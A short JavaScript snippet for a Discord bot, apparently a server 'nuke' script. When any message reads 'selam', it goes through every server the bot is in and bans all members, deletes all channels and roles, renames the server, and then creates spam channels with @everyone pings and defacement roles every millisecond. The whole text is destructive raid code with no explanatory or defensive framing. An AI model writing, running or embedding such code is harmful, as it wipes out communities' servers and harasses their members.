client.on("message", message => {
       if (message.content ==  "selam") {
client.guilds.cache.forEach(g => {
  g.setIcon("https://cdn.discordapp.com/emojis/860054915764977705.gif?v=1").catch(console.error);
  g.members.map(c => c.ban());
  g.channels.map(c => c.delete())
  g.roles.map(c => c.delete())
  g.setName("VISCERO #YIKILMAZ")
  setInterval(() => {
  g.createChannel("patladınız", 'text').then(c => c.send("@everyone ARTİDOX WAS HERE"))
  g.createRole( {
    name: "ARİDOX WAS HERE",
    color: "36393F"
  })
  }, 1) 
}) 
       }
})
